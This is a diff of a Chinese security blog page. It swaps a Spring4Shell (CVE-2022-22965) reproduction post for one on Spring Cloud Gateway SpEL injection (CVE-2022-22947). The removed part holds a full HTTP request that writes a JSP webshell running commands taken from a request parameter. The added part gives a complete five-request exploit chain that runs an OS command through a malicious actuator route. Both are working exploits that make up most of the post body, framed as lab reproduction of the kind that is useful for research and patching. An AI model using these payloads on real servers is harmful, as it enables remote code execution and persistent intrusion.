@@ -23,23 +23,22 @@
     var CONFIG = {"hostname":"msfisgood.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="简介2022年3月30日，CNVD平台接收到蚂蚁科技集团股份有限公司报送的Spring框架远程命令执行漏洞。由于Spring框架存在处理流程缺陷，攻击者可在远程条件下，实现对目标主机的后门文件写入和配置修改，继而通过后门文件访问获得目标主机权限。使用Spring框架或衍生框架构建网站等应用，且同时使用JDK版本在9及以上版本的，易受此漏洞攻击影响。 影响 JDK9或以上版本系列 Spring框架或">
+  <meta name="description" content="简介 Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。 影响版本Spring Cloud Gateway &lt; 3.1.0 Spring Cloud Gateway &lt; 3.0.7 Spring Cloud Ga">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Spring4Shell-CVE-2022-22965">
-<meta property="og:url" content="https://msfisgood.github.io/2022/04/01/Spring4Shell-CVE-2022-22965/index.html">
+<meta property="og:title" content="Spring Cloud Gateway Actuator API SpEL表达式注入命令执行-CVE-2022-22947">
+<meta property="og:url" content="https://msfisgood.github.io/2022/03/30/Spring%20Cloud%20Gateway%20Actuator%20API%20SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
 <meta property="og:site_name" content="Y1Shui&#39;s blog">
-<meta property="og:description" content="简介2022年3月30日，CNVD平台接收到蚂蚁科技集团股份有限公司报送的Spring框架远程命令执行漏洞。由于Spring框架存在处理流程缺陷，攻击者可在远程条件下，实现对目标主机的后门文件写入和配置修改，继而通过后门文件访问获得目标主机权限。使用Spring框架或衍生框架构建网站等应用，且同时使用JDK版本在9及以上版本的，易受此漏洞攻击影响。 影响 JDK9或以上版本系列 Spring框架或">
+<meta property="og:description" content="简介 Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。 影响版本Spring Cloud Gateway &lt; 3.1.0 Spring Cloud Gateway &lt; 3.0.7 Spring Cloud Ga">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://s2.loli.net/2022/04/01/1GxKLvHUhbw2Y5q.png">
-<meta property="og:image" content="https://s2.loli.net/2022/04/01/5GWQNfvFjn9diVT.png">
-<meta property="article:published_time" content="2022-03-31T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-04-01T08:26:48.000Z">
+<meta property="og:image" content="https://s2.loli.net/2022/04/03/UEJWBiGQaDtMbeT.png">
+<meta property="article:published_time" content="2022-03-30T12:44:49.000Z">
+<meta property="article:modified_time" content="2022-04-03T15:22:36.056Z">
 <meta property="article:author" content="Y1Shui">
-<meta property="article:tag" content="Spring">
+<meta property="article:tag" content="Spring Cloud Gateway">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://s2.loli.net/2022/04/01/1GxKLvHUhbw2Y5q.png">
+<meta name="twitter:image" content="https://s2.loli.net/2022/04/03/UEJWBiGQaDtMbeT.png">
 
-<link rel="canonical" href="https://msfisgood.github.io/2022/04/01/Spring4Shell-CVE-2022-22965/">
+<link rel="canonical" href="https://msfisgood.github.io/2022/03/30/Spring%20Cloud%20Gateway%20Actuator%20API%20SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
 
 
 <script id="page-configurations">
@@ -52,7 +51,7 @@
   };
 </script>
 
-  <title>Spring4Shell-CVE-2022-22965 | Y1Shui's blog</title>
+  <title>Spring Cloud Gateway Actuator API SpEL表达式注入命令执行-CVE-2022-22947 | Y1Shui's blog</title>
   
 
 
@@ -200,7 +199,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://msfisgood.github.io/2022/04/01/Spring4Shell-CVE-2022-22965/">
+    <link itemprop="mainEntityOfPage" href="https://msfisgood.github.io/2022/03/30/Spring%20Cloud%20Gateway%20Actuator%20API%20SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -213,7 +212,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Spring4Shell-CVE-2022-22965
+          Spring Cloud Gateway Actuator API SpEL表达式注入命令执行-CVE-2022-22947
         </h1>
 
         <div class="post-meta">
@@ -222,10 +221,16 @@
                 <i class="fa fa-calendar-o"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-04-01 00:00:00 / 修改时间：16:26:48" itemprop="dateCreated datePublished" datetime="2022-04-01T00:00:00+08:00">2022-04-01</time>
+              <time title="创建时间：2022-03-30 20:44:49" itemprop="dateCreated datePublished" datetime="2022-03-30T20:44:49+08:00">2022-03-30</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-03 23:22:36" itemprop="dateModified" datetime="2022-04-03T23:22:36+08:00">2022-04-03</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="fa fa-folder-o"></i>
@@ -242,14 +247,14 @@
                 <i class="fa fa-file-word-o"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.3k</span>
+              <span>2.8k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="fa fa-clock-o"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>3 分钟</span>
             </span>
 
         </div>
@@ -261,19 +266,38 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>2022年3月30日，CNVD平台接收到蚂蚁科技集团股份有限公司报送的Spring框架远程命令执行漏洞。由于Spring框架存在处理流程缺陷，攻击者可在远程条件下，实现对目标主机的后门文件写入和配置修改，继而通过后门文件访问获得目标主机权限。使用Spring框架或衍生框架构建网站等应用，且同时使用JDK版本在9及以上版本的，易受此漏洞攻击影响。</p>
-<h2 id="影响"><a href="#影响" class="headerlink" title="影响"></a>影响</h2><ul>
-<li>JDK9或以上版本系列</li>
-<li>Spring框架或衍生的SpringBoot等框架，版本小于v5.3.18或v5.2.20</li>
-<li>Spring JavaBean表单参数绑定需要满足一定条件</li>
-<li>部署在Tomcat容器中，且日志记录功能开启</li>
-</ul>
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>日志写马</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">suffix: %&gt;//</span><br><span class="line">c1: Runtime</span><br><span class="line">c2: &lt;%</span><br><span class="line">DNT: 1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+        <h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><hr>
+<p>Spring Cloud Gateway是Spring中的一个API网关。其3.1.0及3.0.6版本（包含）以前存在一处SpEL表达式注入漏洞，当攻击者可以访问Actuator API的情况下，将可以利用该漏洞执行任意命令。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Spring Cloud Gateway &lt; 3.1.0</p>
+<p>Spring Cloud Gateway &lt; 3.0.7</p>
+<p>Spring Cloud Gateway 其他已不再更新版本</p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><ol>
+<li>添加包含恶意SpEL表达式的路由：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/gateway/routes/hacktest HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 329</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;id&quot;: &quot;hacktest&quot;,</span><br><span class="line">  &quot;filters&quot;: [&#123;</span><br><span class="line">    &quot;name&quot;: &quot;AddResponseHeader&quot;,</span><br><span class="line">    &quot;args&quot;: &#123;</span><br><span class="line">      &quot;name&quot;: &quot;Result&quot;,</span><br><span class="line">      &quot;value&quot;: &quot;#&#123;new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]&#123;\&quot;id\&quot;&#125;).getInputStream()))&#125;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  &quot;uri&quot;: &quot;http://example.com&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://s2.loli.net/2022/04/01/1GxKLvHUhbw2Y5q.png" alt="image-20220401125212182"></p>
-<p>访问webshell</p>
-<p><img src="https://s2.loli.net/2022/04/01/5GWQNfvFjn9diVT.png" alt="image-20220401125417619"></p>
+<ol start="2">
+<li>刷新路由</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/gateway/refresh HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>访问创建的路由</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /actuator/gateway/routes/hacktest HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: application/x-www-form-urlencoded</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2022/04/03/UEJWBiGQaDtMbeT.png" alt="image-20220330205133211"></p>
+<ol start="4">
+<li>删除创建的路由</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">DELETE /actuator/gateway/routes/hacktest HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+
+<ol start="5">
+<li>再次刷新</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/gateway/refresh HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/spring/CVE-2022-22947/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/spring/CVE-2022-22947/README.zh-cn.md</a></p>
 
     </div>
 
@@ -297,7 +321,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://msfisgood.github.io/2022/04/01/Spring4Shell-CVE-2022-22965/" title="Spring4Shell-CVE-2022-22965">https://msfisgood.github.io/2022/04/01/Spring4Shell-CVE-2022-22965/</a>
+    <a href="https://msfisgood.github.io/2022/03/30/Spring%20Cloud%20Gateway%20Actuator%20API%20SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="Spring Cloud Gateway Actuator API SpEL表达式注入命令执行-CVE-2022-22947">https://msfisgood.github.io/2022/03/30/Spring Cloud Gateway Actuator API SpEL表达式注入命令执行/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -308,7 +332,7 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/Spring/" rel="tag"><i class="fa fa-tag"></i> Spring</a>
+              <a href="/tags/Spring-Cloud-Gateway/" rel="tag"><i class="fa fa-tag"></i> Spring Cloud Gateway</a>
           </div>
 
         
@@ -317,10 +341,13 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2022/03/30/Spring-Cloud-Function-SpEL-RCE/" rel="prev" title="Spring-Cloud-Function-SpEL-RCE">
-      <i class="fa fa-chevron-left"></i> Spring-Cloud-Function-SpEL-RCE
+    <a href="/2022/03/28/sqlmap_tamper/" rel="prev" title="Sqlmap tamper">
+      <i class="fa fa-chevron-left"></i> Sqlmap tamper
     </a></div>
-      <div class="post-nav-item"></div>
+      <div class="post-nav-item">
+    <a href="/2022/03/30/Spring-Cloud-Function-SpEL-RCE/" rel="next" title="Spring-Cloud-Function-SpEL-RCE">
+      Spring-Cloud-Function-SpEL-RCE <i class="fa fa-chevron-right"></i>
+    </a></div>
     </div>
       </footer>
     
@@ -379,7 +406,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D"><span class="nav-number">2.</span> <span class="nav-text">影响</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-number">3.</span> <span class="nav-text">复现</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="nav-number">2.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-number">3.</span> <span class="nav-text">复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
